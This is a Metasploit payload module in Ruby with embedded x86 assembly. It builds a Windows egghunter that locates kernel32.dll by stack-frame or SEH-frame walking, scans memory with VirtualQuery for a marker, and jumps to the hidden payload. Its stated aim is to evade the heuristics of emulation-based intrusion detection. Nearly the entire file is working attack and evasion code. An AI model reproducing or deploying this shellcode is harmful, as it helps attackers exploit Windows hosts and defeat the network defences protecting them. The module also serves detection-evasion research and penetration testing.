##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'ebnids/heuristic/payload/kernel32'


module Metasploit3

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows API-based Egghunting code',
      'Description'   => 'Performs egg-hunt using API instead of SYSCALLs to evade EBNIDS heuristics.',
      'Author'        =>
        [
          'jos wetzels'    # EBNIDS-evasion
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86
    ))

    register_options(
      [
        OptString.new('EVASION_TECHNIQUE', [ true, "EBNIDS kernel32-heuristic evasion technique (0 = stack-frame walk, 1 = seh-frame walk)", "0" ]),
        OptString.new('EGG_MARKER', [ true, "Egghunt marker in DWORD form (to be included as double-dword at start of egg)", "0xCAFECAFE" ])
      ], self.class)
  end

  #
  # Construct the payload
  #
  def generate

    #kernel32.dll base address resolution
    baseResolution = Ebnids::Kernel32Resolution.new

    findFunctionCode = baseResolution.findFunction()

    case datastore['EVASION_TECHNIQUE'].to_i
    when 0
      resolutionCode = baseResolution.stackFrameWalk()
    when 1
      resolutionCode = baseResolution.sehFrameWalk()
    else
      raise ArgumentError, "You must choose a valid evasion technique."
    end

    egghuntMarker = datastore['EGG_MARKER'].hex

    #create actual payload
    payload_data = <<EOS
    jmp entryPoint

    ; code to find function within library
    #{findFunctionCode}

  entryPoint:
    ; code to obtain kernel32.dll base address
    #{resolutionCode}

    push 0xA3C8C8AA ; find VirtualQuery in kernel32.dll
    push eax        ; kernel32.dll base address
    call find_function

    push eax ; save address on stack

  xor ebx,ebx

  ; iterate over memory pages
egghunt:
  or bx,0xfff
nextone:
  inc ebx

  sub esp,0x1c ; reserve space on stack for MEMORY_BASIC_INFORMATION
  mov eax,esp

  push 0x1c ; sizeof(MEMORY_BASIC_INFORMATION)
  push eax ; address of buffer to hold
  push ebx

  call dword [esp + 0x28] ; VirtualQuery address

  mov esi,dword [esp+(4*5)] ; 6th dword holds mbi.protect
  mov edi,dword [esp] ; 1st dword holds region base address
  add edi,dword [esp+(4*3)] ; 4th dword holds region size
  add esp,0x1c ; stack back to normal

  test eax,eax ; 0 = fail, otherwise number of bytes in info buffer
  je egghunt

  sub edi,ebx ; check how much space is left between this address and end of region
  cmp edi,8
  jb egghunt ; must be at least 2 dwords!

  mov eax,esi

  push ebx

  xor esi,esi
  xor ebx,ebx
  mov bl,2

  xor ecx,ecx
  mov cl,7

  ;pass = ((mbi.Protect & PAGE_READONLY) || (mbi.Protect & PAGE_READWRITE) || (mbi.Protect & PAGE_WRITECOPY) || (mbi.Protect & PAGE_EXECUTE_READ) || (mbi.Protect & PAGE_EXECUTE_READWRITE) || (mbi.Protect & PAGE_EXECUTE_WRITECOPY))

  check_loop:
    cmp bl,0x10 ; PAGE_EXECUTE
    je next_iteration ; skip because only EXECUTE rights isn't good
    push eax
    and eax,ebx ; mbi.protect & FLAG
    or esi,eax ; condition |= (mbi.protect & FLAG)
    pop eax
  next_iteration:
    shl ebx,1
  loop check_loop

  pop ebx

  test esi,esi
  jz egghunt

  mov eax,#{egghuntMarker}
  mov edi,ebx
  scasd
  jnz nextone
  scasd
  jnz nextone
  jmp edi
EOS
    self.assembly = payload_data
    super
  end

end
